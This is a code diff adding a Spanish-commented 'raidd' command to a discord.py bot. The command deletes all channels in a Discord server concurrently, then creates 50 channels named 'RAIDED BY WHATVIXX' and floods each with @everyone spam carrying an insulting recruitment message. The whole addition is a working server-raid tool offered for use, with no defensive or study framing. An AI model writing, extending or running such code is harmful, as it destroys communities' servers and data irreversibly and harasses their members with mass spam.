@@ -316,4 +316,70 @@ async def help_command(ctx):
     # Enviar el Embed al canal
     await ctx.send(embed=embed)
 
+@bot.command(name='raidd', aliases=['wipe_and_build'])
+@commands.has_permissions(administrator=True, manage_channels=True)
+async def full_server_reset(ctx):
+    """
+    Combina !nuke y !concurrent_spam: 
+    1. Elimina todos los canales existentes.
+    2. Crea 40 nuevos canales con spam concurrente.
+    """
+    
+    await ctx.send("🚨 **INICIANDO REINICIO COMPLETO DEL SERVIDOR:** Destrucción y Reconstrucción. ¡Acción irreversible!")
+
+    # --- FASE 1: DESTRUCCIÓN (Lógica de !nuke) ---
+    await ctx.send("💥 **[FASE 1/2]** Iniciando Eliminación Masiva de Canales...")
+    
+    deleted_count = 0
+    # Creamos una lista de tareas de eliminación para ejecutar de forma concurrente
+    # Esto hará la eliminación más rápida que un simple 'for loop' secuencial.
+    deletion_tasks = []
+    
+    for channel in ctx.guild.channels:
+        # No eliminar el canal donde se ejecutó el comando
+        if channel.id != ctx.channel.id:
+            deletion_tasks.append(channel.delete())
+
+    # Ejecutar todas las tareas de eliminación simultáneamente
+    # Usamos asyncio.gather y return_exceptions=True para que el fallo en un canal no detenga todo
+    deletion_results = await asyncio.gather(*deletion_tasks, return_exceptions=True)
+    
+    # Contar cuántas eliminaciones fueron exitosas
+    deleted_count = sum(1 for result in deletion_results if not isinstance(result, Exception))
+
+    await ctx.send(f"✅ **[FASE 1/2 COMPLETADA]** Eliminados **{deleted_count}** canales existentes.")
+
+    # --- FASE 2: RECONSTRUCCIÓN (Lógica de !concurrent_spam) ---
+    
+    await ctx.send("🚀 **[FASE 2/2]** Iniciando Creación y Spam de Canales Concurrente...")
+
+    # --- CONFIGURACIÓN DE PARÁMETROS (usamos las mismas variables) ---
+    NUM_CANALES = 50
+    MENSAJES_POR_CANAL = 20
+    NOMBRE_BASE = "RAIDED BY WHATVIXX"
+    CONTENIDO_MENSAJE = "ÚNANSE A SERDÁN PUTITAAS @everyone @here"
+    # ------------------------------------
+
+    tasks = []
+    for i in range(1, NUM_CANALES + 1):
+        nombre_canal = f"{NOMBRE_BASE}-{i:02d}"
+        # Añade la tarea de crear y spamear un canal a la lista
+        tasks.append(
+            create_and_spam_single_channel(ctx.guild, nombre_canal, MENSAJES_POR_CANAL, CONTENIDO_MENSAJE)
+        )
+
+    # Ejecutar todas las tareas de creación y spam de forma concurrente
+    results = await asyncio.gather(*tasks, return_exceptions=True)
+    canales_creados = sum(1 for result in results if result == 1)
+    
+    # Mensaje final
+    if canales_creados > 0:
+        await ctx.send(f"🎉 **[FASE 2/2 COMPLETADA]** Creados y Spameados **{canales_creados}** canales nuevos.")
+        await ctx.send("🟢 **REINICIO COMPLETO FINALIZADO** con éxito.")
+    else:
+        await ctx.send("⚠️ **REINICIO COMPLETADO CON FALLOS.** No se pudieron crear nuevos canales. Revisa los logs.")
+
+# Nota: Asegúrate de que la función 'create_and_spam_single_channel' 
+# esté definida en tu código para que la Fase 2 funcione.
+
 bot.run(BOT_TOKEN) 
